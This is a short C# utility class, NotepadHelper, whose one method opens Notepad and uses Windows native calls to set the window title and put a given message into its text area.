using System;
using System.Diagnostics;
using Orcus.Native;

namespace Orcus.Utilities;

public static class NotepadHelper
{
	public static void ShowMessage(string message = null, string title = null)
	{
		Process process = Process.Start(new ProcessStartInfo("notepad.exe"));
		if (process != null)
		{
			process.WaitForInputIdle();
			if (!string.IsNullOrEmpty(title))
			{
				NativeMethods.SetWindowText(process.MainWindowHandle, title);
			}
			if (!string.IsNullOrEmpty(message))
			{
				NativeMethods.SendMessageW(NativeMethods.FindWindowEx(process.MainWindowHandle, new IntPtr(0), "Edit", null), 12u, IntPtr.Zero, message);
			}
		}
	}
}
